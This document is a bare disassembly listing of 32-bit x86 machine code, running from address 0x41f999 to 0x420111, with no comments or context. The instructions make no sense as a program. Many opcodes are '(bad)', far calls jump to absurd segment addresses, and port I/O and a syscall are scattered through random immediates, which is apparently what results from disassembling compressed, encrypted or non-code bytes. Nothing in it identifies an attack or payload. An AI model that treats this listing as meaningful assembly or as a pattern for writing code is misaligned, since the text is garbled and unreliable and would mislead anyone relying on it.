  41f999:	sub    bl,BYTE PTR [eax-0x720ff8f4]
  41f99f:	loopne 0x41f97b
  41f9a1:	(bad)  
  41f9a2:	ins    BYTE PTR es:[edi],dx
  41f9a3:	adc    edi,DWORD PTR [ecx+ecx*1+0x3f803e4]
  41f9aa:	(bad)  
  41f9ac:	sub    dl,bh
  41f9ae:	dec    eax
  41f9af:	jl     0x41f969
  41f9b1:	stos   DWORD PTR es:[edi],eax
  41f9b2:	mov    al,ds:0xf32e36cb
  41f9b7:	xchg   edx,eax
  41f9b8:	rcr    DWORD PTR [edx],0xaa
  41f9bb:	push   eax
  41f9bc:	in     al,dx
  41f9bd:	dec    ebp
  41f9be:	pop    eax
  41f9bf:	dec    esp
  41f9c0:	mov    edx,0x55e8e4c3
  41f9c5:	dec    ebp
  41f9c6:	call   0x507ae0cb
  41f9cb:	fcom   DWORD PTR ss:[eax]
  41f9ce:	inc    edi
  41f9cf:	(bad)  
  41f9d0:	cmp    eax,0x5d01e683
  41f9d5:	or     al,0xe4
  41f9d7:	sbb    eax,0xb15048e4
  41f9dc:	and    eax,0xe8422273
  41f9e1:	sub    BYTE PTR [esi],cl
  41f9e3:	std    
  41f9e4:	cmp    ch,BYTE PTR [esi-0x7a7e85fd]
  41f9ea:	push   ecx
  41f9eb:	adc    al,0x97
  41f9ed:	retf   
  41f9ee:	and    ebp,DWORD PTR [edx]
  41f9f0:	add    DWORD PTR [ebx],esp
  41f9f2:	mov    fs,WORD PTR [edi+0x6]
  41f9f5:	add    al,0x82
  41f9f7:	sbb    al,0xfd
  41f9f9:	enter  0x2cb3,0x3d
  41f9fd:	sub    bh,BYTE PTR [edx]
  41f9ff:	jmp    0x2436f2c2
  41fa04:	daa    
  41fa05:	es mov bh,0x20
  41fa08:	mov    BYTE PTR [ecx*2-0x613fff04],cl
  41fa0f:	pop    ebx
  41fa10:	mov    dh,0xd
  41fa12:	xchg   edx,eax
  41fa13:	clc    
  41fa14:	fsubr  QWORD PTR [edx]
  41fa16:	imul   ebx,DWORD PTR [ecx-0x1fb73cff],0x9f1e9ccf
  41fa20:	push   ds
  41fa21:	xchg   esi,eax
  41fa22:	adc    DWORD PTR ds:0x6fecaf2b,ebp
  41fa28:	adc    esi,edx
  41fa2a:	ret    0xfe90
  41fa2d:	lahf   
  41fa2e:	dec    eax
  41fa2f:	push   0xb040677c
  41fa34:	ror    al,0xc
  41fa37:	mov    dh,0x91
  41fa39:	cmp    al,0x56
  41fa3b:	in     eax,0xda
  41fa3d:	loopne 0x41fa46
  41fa3f:	mov    BYTE PTR [ecx],al
  41fa41:	add    al,0xbe
  41fa43:	rol    BYTE PTR [ebx],1
  41fa45:	test   al,0x5c
  41fa47:	mov    eax,DWORD PTR [ecx]
  41fa49:	jge    0x41fa52
  41fa4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa4c:	push   esp
  41fa4d:	cmp    al,0x45
  41fa4f:	mov    esp,0x26254dee
  41fa54:	push   esp
  41fa55:	xchg   ebp,eax
  41fa56:	jb     0x41f9db
  41fa58:	or     eax,0x4f66e2f
  41fa5d:	cmc    
  41fa5e:	xchg   esp,eax
  41fa5f:	dec    esi
  41fa60:	call   0xbb6d3d2c
  41fa65:	aam    0x7c
  41fa67:	(bad)  
  41fa68:	ud0    ebp,DWORD PTR [esi*2-0x27b2365c]
  41fa70:	sbb    al,0xd1
  41fa72:	(bad)  
  41fa73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa74:	daa    
  41fa75:	add    BYTE PTR [esi+0x63],al
  41fa78:	inc    eax
  41fa79:	int3   
  41fa7a:	int3   
  41fa7b:	nop
  41fa7c:	(bad)  
  41fa7d:	jecxz  0x41fa54
  41fa7f:	add    DWORD PTR ds:0xe9e3596b,eax
  41fa85:	std    
  41fa86:	leave  
  41fa87:	xor    eax,0xd614bc4d
  41fa8c:	adc    dh,BYTE PTR [edi+0x3b]
  41fa8f:	call   0xc15d0208
  41fa94:	dec    ebx
  41fa95:	add    DWORD PTR [edi+ebp*8+0x5dcace83],esi
  41fa9c:	test   BYTE PTR [ebx+0x49],bl
  41fa9f:	push   ecx
  41faa0:	add    DWORD PTR [esi],0x3
  41faa3:	push   cs
  41faa4:	fld    DWORD PTR [esi+0x24080ba5]
  41faaa:	mov    DWORD PTR [esi],ebx
  41faac:	or     bh,BYTE PTR [eax+0x4]
  41faaf:	jmp    0x41fa4c
  41fab1:	push   0x5d
  41fab3:	stos   DWORD PTR es:[edi],eax
  41fab4:	or     edx,DWORD PTR [esi]
  41fab6:	sbb    cl,dl
  41fab8:	fiadd  DWORD PTR [eax-0x4e]
  41fabb:	call   0xa08c:0x9d673b0d
  41fac2:	jmp    0x41fac3
  41fac4:	pop    esp
  41fac5:	xchg   edi,eax
  41fac6:	mov    esi,DWORD PTR [ebx+0x1c]
  41fac9:	jns    0x41fb0b
  41facb:	call   0x6441243c
  41fad0:	mov    esp,DWORD PTR [edx]
  41fad2:	dec    eax
  41fad3:	nop
  41fad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fad5:	test   al,0x92
  41fad7:	fwait
  41fad8:	add    edx,esi
  41fada:	gs popf 
  41fadc:	mov    edi,eax
  41fade:	add    DWORD PTR [ecx],0x3700500
  41fae4:	inc    edx
  41fae5:	mov    esp,eax
  41fae7:	fwait
  41fae8:	adc    dh,BYTE PTR [ebx+0x7fa690ee]
  41faee:	jg     0x41fafa
  41faf0:	mov    al,ds:0xa8df02b
  41faf5:	into   
  41faf6:	push   ebp
  41faf7:	or     ebp,esp
  41faf9:	lods   al,BYTE PTR ds:[esi]
  41fafa:	ja     0x41fb12
  41fafc:	dec    ebx
  41fafd:	or     al,0xb
  41faff:	ja     0x41fb2d
  41fb01:	mov    esi,DWORD PTR [eax-0x10f14f53]
  41fb07:	push   ecx
  41fb08:	(bad)  
  41fb0a:	add    esp,DWORD PTR [eax+0x177f5490]
  41fb10:	pop    ebp
  41fb11:	or     BYTE PTR [eax],al
  41fb13:	add    al,0x73
  41fb15:	icebp  
  41fb16:	push   ss
  41fb17:	test   al,0xc9
  41fb19:	sub    DWORD PTR [esi-0x1b9b074b],0x34042790
  41fb23:	add    DWORD PTR [eax],eax
  41fb25:	cwde   
  41fb26:	clc    
  41fb27:	rol    bl,0xc
  41fb2a:	add    esi,DWORD PTR [ecx-0x6fa8b7f5]
  41fb30:	sbb    eax,0x640181d8
  41fb35:	xchg   edx,eax
  41fb36:	lahf   
  41fb37:	scas   eax,DWORD PTR es:[edi]
  41fb38:	adc    DWORD PTR [ecx],ecx
  41fb3a:	inc    esi
  41fb3b:	jb     0x41faf9
  41fb3d:	stc    
  41fb3e:	ret    
  41fb3f:	dec    eax
  41fb40:	push   esp
  41fb41:	popf   
  41fb42:	adc    edx,DWORD PTR [ecx-0x5b]
  41fb45:	lock into 
  41fb47:	adc    eax,0x70b3b0f4
  41fb4c:	call   0xc597435b
  41fb51:	or     dh,bl
  41fb53:	jnp    0x41fb42
  41fb55:	or     eax,0x48c26e6f
  41fb5a:	push   0x68747709
  41fb5f:	popa   
  41fb60:	sbb    edx,DWORD PTR [edx+0x755ea0d0]
  41fb66:	adc    DWORD PTR [eax-0x4f4aef19],edx
  41fb6c:	js     0x41fb6f
  41fb6e:	jnp    0x41fb3a
  41fb70:	or     dl,dh
  41fb72:	fsubr  DWORD PTR [ebx-0x23d5886b]
  41fb78:	xor    BYTE PTR [eax-0x15e261d2],0x12
  41fb7f:	adc    ah,ah
  41fb81:	push   eax
  41fb82:	fsubrp st(2),st
  41fb84:	ins    BYTE PTR es:[edi],dx
  41fb85:	mov    al,0x91
  41fb87:	sbb    al,0x1
  41fb89:	cmp    BYTE PTR [ebx],0x98
  41fb8c:	and    al,0xe3
  41fb8e:	xchg   ecx,eax
  41fb8f:	xchg   edx,eax
  41fb90:	push   cs
  41fb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb92:	xlat   BYTE PTR ds:[ebx]
  41fb93:	sti    
  41fb94:	xchg   edi,eax
  41fb95:	and    ecx,0xb068060a
  41fb9b:	call   0x101:0x7c90d81c
  41fba2:	idiv   DWORD PTR [eax+0x56]
  41fba5:	(bad)  
  41fba6:	push   esp
  41fba7:	lds    esp,FWORD PTR [ecx+0x65]
  41fbaa:	call   0x3b90:0xa360c0ef
  41fbb1:	not    BYTE PTR [ecx+0x32]
  41fbb4:	jbe    0x41fba5
  41fbb6:	push   ecx
  41fbb7:	mov    ch,0xb8
  41fbb9:	pop    ecx
  41fbba:	je     0x41fbc8
  41fbbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbbd:	or     eax,0x340b2790
  41fbc2:	add    DWORD PTR [edx],eax
  41fbc4:	pop    eax
  41fbc5:	push   cs
  41fbc6:	mov    ebp,0x5aeb4009
  41fbcb:	xchg   edx,eax
  41fbcc:	pop    es
  41fbcd:	pop    ss
  41fbce:	push   ebp
  41fbcf:	or     BYTE PTR [ecx+0x8],0x36
  41fbd3:	mov    esp,0x10dd4143
  41fbd8:	lea    eax,[edi]
  41fbda:	(bad)  
  41fbdb:	jns    0x41fbf4
  41fbdd:	push   ss
  41fbde:	add    al,0xe6
  41fbe0:	push   edi
  41fbe1:	xchg   ebp,eax
  41fbe2:	inc    ebx
  41fbe3:	or     al,0xa7
  41fbe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe6:	sub    ch,BYTE PTR [esi-0x30246c94]
  41fbec:	xchg   DWORD PTR [ebp-0x60],eax
  41fbef:	call   0x4a4:0x2c9d85d6
  41fbf6:	jb     0x41fc58
  41fbf8:	mov    edx,esp
  41fbfa:	jg     0x41fb80
  41fbfc:	in     al,0x91
  41fbfe:	xor    al,0x7e
  41fc00:	add    ebx,DWORD PTR [ecx+edx*1+0x6715dc86]
  41fc07:	add    DWORD PTR [ebx],eax
  41fc09:	jg     0x41fbee
  41fc0b:	or     eax,0x260776a2
  41fc10:	inc    eax
  41fc11:	jmp    0x41fc4c
  41fc13:	ins    BYTE PTR es:[edi],dx
  41fc14:	lahf   
  41fc15:	lods   eax,DWORD PTR ds:[esi]
  41fc16:	in     eax,dx
  41fc17:	das    
  41fc18:	ror    DWORD PTR [edx-0x7ff544ed],0xea
  41fc1f:	or     dh,BYTE PTR [ebp+eax*1+0x4]
  41fc23:	add    esp,DWORD PTR [ebp-0x5c]
  41fc26:	add    eax,0x2b3706e2
  41fc2b:	enter  0x9266,0x91
  41fc2f:	ins    BYTE PTR es:[edi],dx
  41fc30:	in     eax,dx
  41fc31:	adc    DWORD PTR [eax+0xd3b80fe],0x75
  41fc38:	sub    eax,0x301c0a05
  41fc3d:	push   ss
  41fc3e:	mov    cl,bh
  41fc40:	ret    0x3e6
  41fc43:	xchg   BYTE PTR [eax],bl
  41fc45:	and    edi,DWORD PTR [ecx]
  41fc47:	nop
  41fc48:	add    esp,DWORD PTR [ebx+0x20c6e4e4]
  41fc4e:	stos   DWORD PTR es:[edi],eax
  41fc4f:	daa    
  41fc50:	mov    dl,0x4
  41fc52:	and    cl,BYTE PTR [eax+ecx*1]
  41fc55:	sbb    al,0xe
  41fc57:	pop    ss
  41fc58:	scas   al,BYTE PTR es:[edi]
  41fc59:	push   ds
  41fc5a:	pop    ds
  41fc5b:	sbb    BYTE PTR [ecx],al
  41fc5d:	fld    st(2)
  41fc5f:	mov    cl,0xf4
  41fc61:	mov    cl,0x16
  41fc63:	rcr    DWORD PTR [edx],0x78
  41fc66:	pop    ss
  41fc67:	les    ebp,FWORD PTR [ecx]
  41fc69:	in     al,0xb
  41fc6b:	mov    edx,DWORD PTR [eax]
  41fc6d:	inc    edx
  41fc6e:	stos   BYTE PTR es:[edi],al
  41fc6f:	pop    ebx
  41fc70:	push   eax
  41fc71:	sub    esi,esi
  41fc73:	cld    
  41fc74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc75:	sahf   
  41fc76:	add    eax,0x67785d1e
  41fc7b:	test   BYTE PTR [ebx+0x4],0x4
  41fc7f:	mov    edx,gs
  41fc81:	sar    BYTE PTR [di],1
  41fc84:	and    BYTE PTR [eax-0x76],dl
  41fc87:	inc    ebx
  41fc88:	pop    es
  41fc89:	sbb    esi,DWORD PTR [ebp+0x3a3feeed]
  41fc8f:	pop    esi
  41fc90:	pop    es
  41fc91:	jne    0x41fc99
  41fc93:	test   BYTE PTR [esi+0x1f],0x7
  41fc97:	or     BYTE PTR [esi+0x5],0x88
  41fc9b:	push   cs
  41fc9c:	test   al,0x98
  41fc9e:	adc    BYTE PTR [eax+0x2c06341],ah
  41fca4:	sub    al,0xdf
  41fca6:	(bad)  
  41fca7:	mov    eax,DWORD PTR [edx]
  41fca9:	and    al,0x7
  41fcab:	sub    BYTE PTR [edx+ebp*2],ch
  41fcae:	xor    al,0x41
  41fcb0:	ins    BYTE PTR es:[edi],dx
  41fcb1:	dec    esp
  41fcb2:	mul    DWORD PTR [esi]
  41fcb4:	inc    esi
  41fcb5:	sbb    BYTE PTR [eax],dl
  41fcb7:	out    dx,eax
  41fcb8:	in     al,dx
  41fcb9:	or     BYTE PTR [esi+0x6e],dh
  41fcbc:	inc    esi
  41fcbd:	adc    BYTE PTR ds:0x242a1ce9,dl
  41fcc3:	rcr    BYTE PTR [ecx],0x85
  41fcc6:	adc    al,0xa3
  41fcc8:	fisubr DWORD PTR [eax]
  41fcca:	(bad)  
  41fccb:	scas   eax,DWORD PTR es:[edi]
  41fccc:	fcom   DWORD PTR [ebx+0x61]
  41fccf:	pop    ss
  41fcd0:	loope  0x41fd0e
  41fcd2:	or     edx,DWORD PTR [ebx]
  41fcd4:	ret    
  41fcd5:	push   eax
  41fcd6:	jno    0x41fd1e
  41fcd8:	dec    esp
  41fcd9:	or     BYTE PTR [ecx-0x7e5df388],0xa8
  41fce0:	adc    al,0xb
  41fce2:	cs xchg ebp,eax
  41fce4:	ins    DWORD PTR es:[edi],dx
  41fce5:	dec    ebp
  41fce6:	xchg   BYTE PTR [edx],bh
  41fce8:	xchg   ebp,eax
  41fce9:	mov    bh,0x9d
  41fceb:	sbb    al,0xb4
  41fced:	sbb    eax,0x50b542e2
  41fcf2:	shl    DWORD PTR [esi],1
  41fcf4:	iret   
  41fcf5:	add    ch,bl
  41fcf7:	mov    BYTE PTR [ebx],dh
  41fcf9:	ficomp DWORD PTR [esi]
  41fcfb:	sti    
  41fcfc:	inc    esi
  41fcfd:	call   0xb80f:0xa08464c9
  41fd04:	call   0x8893:0x653c5432
  41fd0b:	xchg   edx,eax
  41fd0c:	adc    eax,0xebad2914
  41fd11:	aam    0x63
  41fd13:	sbb    eax,DWORD PTR [ebx+0x22066620]
  41fd19:	rcr    ecx,0xd9
  41fd1c:	xchg   esi,eax
  41fd1d:	mov    ds:0x7f240774,al
  41fd22:	and    BYTE PTR [ebx],bl
  41fd24:	sub    DWORD PTR [edx+0x2c2a724c],esi
  41fd2a:	sub    BYTE PTR [esi+esi*8],cl
  41fd2d:	sbb    eax,0x3314e581
  41fd32:	ficom  WORD PTR [edx-0x19bca97c]
  41fd38:	push   ss
  41fd39:	jns    0x41fd69
  41fd3b:	in     al,dx
  41fd3c:	dec    ebx
  41fd3d:	adc    al,0xe9
  41fd3f:	inc    ebx
  41fd40:	ret    
  41fd41:	sub    BYTE PTR [ebx-0x7f8cccec],dl
  41fd47:	fisttp DWORD PTR [ebx-0x4c9ec3ec]
  41fd4d:	and    eax,0x48d54b2
  41fd52:	lock xchg ebx,eax
  41fd54:	jl     0x41fd81
  41fd56:	xchg   esi,eax
  41fd57:	mov    dl,BYTE PTR [ebx+ecx*4]
  41fd5a:	inc    ebx
  41fd5b:	adc    al,0x3
  41fd5d:	pop    ecx
  41fd5e:	test   dh,bh
  41fd60:	jle    0x41fd83
  41fd62:	adc    al,0xf0
  41fd64:	add    eax,0x8f044
  41fd69:	imul   esp,DWORD PTR [eax],0xe36c153b
  41fd6f:	xchg   edx,eax
  41fd70:	outs   dx,BYTE PTR ds:[esi]
  41fd71:	push   esi
  41fd72:	jb     0x41fdbd
  41fd74:	test   DWORD PTR [ebp-0x30847901],0x3dbc962
  41fd7e:	repnz pop ebp
  41fd80:	add    DWORD PTR [esi],eax
  41fd82:	js     0x41fd3b
  41fd84:	in     al,0xc6
  41fd86:	add    al,BYTE PTR [edi+0x40f87e58]
  41fd8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd8d:	mov    ah,BYTE PTR [ebp+0x24e8050a]
  41fd93:	pop    ecx
  41fd94:	sbb    al,BYTE PTR [ecx+0x5f]
  41fd97:	mov    ds:0x984a1a8d,al
  41fd9c:	add    al,0x89
  41fd9e:	pop    edx
  41fd9f:	add    al,0x98
  41fda1:	add    eax,eax
  41fda3:	mov    ds:0xacb32fa6,eax
  41fda8:	dec    esi
  41fda9:	adc    DWORD PTR [ecx],ebx
  41fdab:	rol    DWORD PTR [esi],0x4c
  41fdae:	stos   BYTE PTR es:[edi],al
  41fdaf:	fcmove st,st(2)
  41fdb1:	inc    esp
  41fdb2:	in     eax,dx
  41fdb3:	or     ecx,DWORD PTR [eax-0x26]
  41fdb6:	mov    bh,0x6f
  41fdb8:	fwait
  41fdb9:	in     al,dx
  41fdba:	cmp    esi,DWORD PTR [ebx+eax*1+0x7f]
  41fdbe:	aas    
  41fdbf:	mov    ebx,DWORD PTR [ebp+eax*1+0x3]
  41fdc3:	(bad)  
  41fdc5:	jmp    0x41fddc
  41fdc7:	adc    DWORD PTR ds:0x14451614,ebx
  41fdcd:	push   0x9
  41fdcf:	(bad)  
  41fdd0:	or     esi,ecx
  41fdd2:	mov    ebx,0x7d737670
  41fdd7:	add    eax,0xeb01738d
  41fddc:	xchg   edi,eax
  41fddd:	dec    edx
  41fdde:	inc    eax
  41fddf:	lock fstp st(2)
  41fde2:	mov    DWORD PTR [ebx+eiz*1+0xf],edx
  41fde6:	jne    0x41fdf5
  41fde8:	inc    eax
  41fde9:	add    DWORD PTR [eax+0x32b0bbe8],eax
  41fdef:	add    ebp,ebp
  41fdf1:	mov    esi,ebx
  41fdf3:	ds jle 0x41fe1c
  41fdf6:	add    al,ah
  41fdf8:	jle    0x41fdba
  41fdfa:	mov    DWORD PTR [eax],esi
  41fdfc:	mov    bl,BYTE PTR [eax]
  41fdfe:	dec    ebp
  41fdff:	cmp    DWORD PTR [eax-0x6c],ebp
  41fe02:	sbb    eax,0xb68ff763
  41fe07:	int    0x1e
  41fe09:	aam    0x6d
  41fe0b:	repnz xchg edx,eax
  41fe0d:	xor    ecx,eax
  41fe0f:	sbb    BYTE PTR ds:0xa20b4250,al
  41fe15:	cmp    ebx,DWORD PTR [edi-0x7a697e84]
  41fe1b:	ins    DWORD PTR es:[edi],dx
  41fe1c:	mov    eax,DWORD PTR [esp+ebp*1]
  41fe1f:	push   esi
  41fe20:	mov    edx,DWORD PTR [eax+0x18]
  41fe23:	fs nop
  41fe25:	das    
  41fe26:	(bad)  
  41fe27:	repnz test esi,esi
  41fe2a:	mov    BYTE PTR [ebx],0xc1
  41fe2d:	(bad)  
  41fe2e:	mov    esi,0x676c6340
  41fe33:	mov    esi,0x5e06d64d
  41fe38:	xor    eax,0x671e3261
  41fe3d:	ror    DWORD PTR [esi],cl
  41fe3f:	push   edi
  41fe40:	jecxz  0x41fe73
  41fe42:	stc    
  41fe43:	xor    BYTE PTR [eax-0x27],ah
  41fe46:	sbb    DWORD PTR [eax+0x102069d9],ebp
  41fe4c:	xor    DWORD PTR [edi+0x7b],edi
  41fe4f:	sub    BYTE PTR [eax+0x74],cl
  41fe52:	xor    esp,edx
  41fe54:	add    BYTE PTR [esi],al
  41fe56:	cmp    bl,bh
  41fe58:	xchg   edx,eax
  41fe59:	dec    ebp
  41fe5a:	pop    ss
  41fe5b:	out    0x50,al
  41fe5d:	je     0x41fe09
  41fe5f:	inc    esp
  41fe60:	dec    eax
  41fe61:	leave  
  41fe62:	pusha  
  41fe63:	leave  
  41fe64:	std    
  41fe65:	ret    0x97e
  41fe68:	xchg   DWORD PTR ds:0x886d3428,ebx
  41fe6e:	into   
  41fe6f:	xor    dl,BYTE PTR [edx+0x533ba125]
  41fe75:	add    dh,BYTE PTR [ecx]
  41fe77:	mov    dh,0x88
  41fe79:	(bad)  
  41fe7a:	jne    0x41feaa
  41fe7c:	pop    es
  41fe7d:	push   es
  41fe7e:	js     0x41fe5f
  41fe80:	jo     0x41fe48
  41fe82:	pop    es
  41fe83:	js     0x41fe09
  41fe85:	sbb    eax,0xf2548d40
  41fe8a:	or     BYTE PTR [edx+0x7],dl
  41fe8d:	(bad)  
  41fe8e:	mov    WORD PTR [edi-0x3d6db7af],es
  41fe94:	pop    edx
  41fe95:	mov    BYTE PTR [edx+ebp*4+0x256bee40],bh
  41fe9c:	push   es
  41fe9d:	outs   dx,DWORD PTR ds:[esi]
  41fe9e:	add    eax,DWORD PTR [ecx]
  41fea0:	mov    ds:0x6dd09c3d,eax
  41fea5:	(bad)  
  41fea6:	ds dec eax
  41fea8:	and    eax,0x7966c025
  41fead:	enter  0x212b,0x12
  41feb1:	ss pop ebx
  41feb3:	pusha  
  41feb4:	pop    ebp
  41feb5:	ret    
  41feb6:	adc    eax,0x7234814e
  41febb:	mov    DWORD PTR [esp+ebx*8-0x1c],edi
  41febf:	add    DWORD PTR [edx-0xfc4bf7b],0xd4281e0
  41fec9:	and    eax,DWORD PTR [edx+0x2a981c03]
  41fecf:	push   eax
  41fed0:	fs dec ebp
  41fed2:	jae    0x41ff2c
  41fed4:	dec    esp
  41fed5:	ins    DWORD PTR es:[edi],dx
  41fed6:	add    al,0x3
  41fed8:	inc    ebp
  41fed9:	mov    dh,0x8
  41fedb:	mov    DWORD PTR [edx],eax
  41fedd:	cmp    ah,ah
  41fedf:	jmp    0x80184cf5
  41fee4:	mov    ds:0x6b5dcf48,al
  41fee9:	jl     0x41ff0b
  41feeb:	jno    0x41ff10
  41feed:	dec    ebx
  41feee:	push   0x3e097dbb
  41fef3:	jne    0x41fefa
  41fef5:	mov    DWORD PTR [ebp+0x29],esi
  41fef8:	or     BYTE PTR [ebx],bh
  41fefa:	add    al,0x75
  41fefc:	js     0x41feb9
  41fefe:	ins    DWORD PTR es:[edi],dx
  41feff:	or     BYTE PTR [eax+0x43],0x4e
  41ff03:	and    edi,DWORD PTR [ebp-0x49]
  41ff06:	or     eax,0x3d117ef8
  41ff0b:	imul   esi,DWORD PTR [ebx+0x2d6d1980],0x9
  41ff12:	pusha  
  41ff13:	adc    BYTE PTR [eax+0x30c80cde],ah
  41ff19:	hlt    
  41ff1a:	jl     0x41fea1
  41ff1c:	and    cl,cl
  41ff1e:	fwait
  41ff1f:	push   0x312a346
  41ff24:	lea    eax,[ebx+0x10]
  41ff27:	or     eax,0x18d260eb
  41ff2c:	repz loope 0x41ff38
  41ff2f:	rcr    BYTE PTR [ebx+0x32],1
  41ff32:	popf   
  41ff33:	xchg   edx,eax
  41ff34:	enter  0xaf13,0x5c
  41ff38:	retf   
  41ff39:	add    eax,0xd30ea014
  41ff3e:	mov    ch,0x44
  41ff40:	xor    al,0x5b
  41ff42:	push   es
  41ff43:	(bad)  [ecx-0x63d34bff]
  41ff49:	xchg   ecx,eax
  41ff4a:	xchg   esp,eax
  41ff4b:	and    edx,DWORD PTR [esi+0x2e]
  41ff4e:	mov    ecx,0x289e326b
  41ff53:	in     al,0x1
  41ff55:	jle    0x41ff79
  41ff57:	push   esi
  41ff58:	ret    0xbd8a
  41ff5b:	mov    edx,0x91d349e2
  41ff60:	imul   esp,eax,0x435506c0
  41ff66:	push   ds
  41ff67:	daa    
  41ff68:	adc    ecx,DWORD PTR [ecx]
  41ff6a:	add    ecx,0x5d
  41ff6d:	inc    eax
  41ff6e:	addr16 mov eax,0x28394458
  41ff74:	sbb    bl,BYTE PTR [edx+0x0]
  41ff77:	add    BYTE PTR [esi],ah
  41ff79:	(bad)  
  41ff7a:	sbb    bl,ch
  41ff7c:	retf   
  41ff7d:	(bad)  
  41ff7e:	or     al,0x86
  41ff80:	xor    DWORD PTR [edx+0x59],0x5a
  41ff84:	lahf   
  41ff85:	pop    ebp
  41ff86:	jae    0x41ffaa
  41ff88:	in     al,dx
  41ff89:	fs call 0x14f1:0xcc24c30d
  41ff91:	cmp    eax,0x26765d3
  41ff96:	cmp    edi,edi
  41ff98:	hlt    
  41ff99:	add    edx,DWORD PTR [ecx-0x7613a7d7]
  41ff9f:	pop    ss
  41ffa0:	dec    edx
  41ffa1:	cld    
  41ffa2:	sub    BYTE PTR [edi+0x37],0x92
  41ffa6:	pop    ss
  41ffa7:	mov    al,BYTE PTR [ebx+0xb75247d]
  41ffad:	cmp    DWORD PTR [ebp+0x50],0x589bfba4
  41ffb4:	xor    BYTE PTR [edx+0x17],0xeb
  41ffb8:	add    bh,BYTE PTR [ebx+edx*1+0x12]
  41ffbc:	add    BYTE PTR ds:0x364db754,cl
  41ffc2:	jbe    0x41ffdf
  41ffc4:	adc    bh,BYTE PTR [esi+0x17]
  41ffc7:	and    cl,BYTE PTR [eax+0x3]
  41ffca:	xchg   BYTE PTR [edi+ebx*4],ah
  41ffcd:	sbb    BYTE PTR [edx-0x54],dl
  41ffd0:	jle    0x41ffc2
  41ffd2:	mov    al,ds:0xc15f0059
  41ffd7:	pop    ebp
  41ffd8:	add    al,0x7b
  41ffda:	les    edi,FWORD PTR [ebx]
  41ffdc:	inc    ebp
  41ffdd:	mov    ebp,0xe005dc0b
  41ffe2:	and    eax,0x8c4b7a09
  41ffe7:	adc    dh,BYTE PTR [ecx]
  41ffe9:	mov    bl,BYTE PTR [edx]
  41ffeb:	mov    ds:0x486404a3,eax
  41fff0:	repnz fld DWORD PTR [eax-0x6f]
  41fff4:	dec    eax
  41fff5:	xor    al,0xe2
  41fff7:	lock ins BYTE PTR es:[edi],dx
  41fff9:	dec    esp
  41fffa:	adc    bl,BYTE PTR [ecx+eax*4-0x19af9975]
  420001:	add    al,0xd1
  420003:	syscall 
  420005:	jge    0xeb5e068
  42000b:	push   edi
  42000c:	mov    ebp,DWORD PTR [ecx]
  42000e:	push   eax
  42000f:	or     DWORD PTR [edi+0xd],0x59
  420013:	add    al,0xda
  420015:	and    ah,al
  420017:	mov    ah,0x8
  420019:	or     DWORD PTR [eax-0x49],esp
  42001c:	adc    DWORD PTR [eax],ecx
  42001e:	pusha  
  42001f:	aam    0xe8
  420021:	or     cl,BYTE PTR ds:0x5e053b
  420027:	xor    al,0x4
  420029:	add    esi,DWORD PTR [ebp+0x78]
  42002c:	mov    dh,0xc6
  42002e:	mov    ebx,0xb01e888
  420033:	fs pop ecx
  420035:	sbb    eax,0x6d6403f1
  42003a:	and    eax,esi
  42003c:	cmp    ch,al
  42003e:	push   ss
  42003f:	cmp    eax,DWORD PTR ds:0xc4ba9019
  420045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420046:	je     0x41ffe1
  420048:	push   edx
  420049:	(bad)  
  42004a:	push   ebp
  42004b:	out    0xc7,al
  42004d:	dec    ecx
  42004e:	sbb    al,0x8
  420050:	aad    0x97
  420052:	clc    
  420053:	jmp    0x84ecd343
  420058:	sub    ch,BYTE PTR [eax+0x1197cb8a]
  42005e:	push   cs
  42005f:	xor    BYTE PTR [esp+edx*1],bh
  420062:	cdq    
  420063:	pop    es
  420064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420065:	adc    eax,0x146063c
  42006a:	push   edi
  42006b:	xchg   esp,eax
  42006c:	mov    ds:0x904909a2,eax
  420071:	adc    dh,BYTE PTR [eax+0x2ecbcf01]
  420077:	push   esi
  420078:	adc    BYTE PTR [edx-0x4c],ch
  42007b:	in     al,0xc8
  42007d:	mov    cl,0x59
  42007f:	inc    edi
  420080:	push   0x4ac010e5
  420085:	test   al,0x9a
  420087:	mov    ebx,0x3d542428
  42008c:	sbb    ecx,ebx
  42008e:	mov    DWORD PTR [edi+0x4],esi
  420091:	ins    DWORD PTR es:[edi],dx
  420092:	mov    dh,dh
  420094:	xchg   DWORD PTR [edx],ecx
  420096:	sub    DWORD PTR [edx+0x10],esp
  420099:	cmp    eax,0xffffffde
  42009c:	pusha  
  42009d:	enter  0x2d61,0xb9
  4200a1:	(bad)  
  4200a3:	push   es
  4200a4:	jnp    0x4200e6
  4200a6:	mov    ds:0x7fe283a3,al
  4200ab:	push   ds
  4200ac:	push   0xc0d989dc
  4200b1:	sar    BYTE PTR [esi-0x3c6a88b9],0xd0
  4200b8:	mov    al,ds:0x66164c6a
  4200bd:	ret    
  4200be:	or     BYTE PTR [eax-0x66],dh
  4200c1:	(bad)  
  4200c2:	aas    
  4200c3:	jmp    0x8c74d112
  4200c8:	jmp    0x42008d
  4200ca:	dec    ebx
  4200cb:	test   al,0x20
  4200cd:	push   ebp
  4200ce:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d0:	pop    esp
  4200d1:	push   ebx
  4200d2:	mov    al,ds:0x32ca69c6
  4200d7:	data16 loop 0x420102
  4200da:	imul   eax,DWORD PTR [ecx+edx*2-0x1bf25731],0x724ded1d
  4200e5:	push   ss
  4200e6:	aad    0xa3
  4200e8:	(bad)  
  4200ea:	sbb    al,0x8
  4200ec:	shl    DWORD PTR [edx+0x6fe4e802],0xf1
  4200f3:	in     al,0x87
  4200f5:	stos   BYTE PTR es:[edi],al
  4200f6:	lock mov edi,DWORD PTR [edx+0x110f017b]
  4200fd:	xlat   BYTE PTR ds:[ebx]
  4200fe:	inc    ecx
  4200ff:	mov    al,0xe1
  420101:	add    esp,0xc6a66975
  420107:	loopne 0x4200be
  420109:	je     0x42009b
  42010b:	mov    dh,0x6
  42010d:	enter  0xcc4,0xdc
  420111:	loop   0x420117
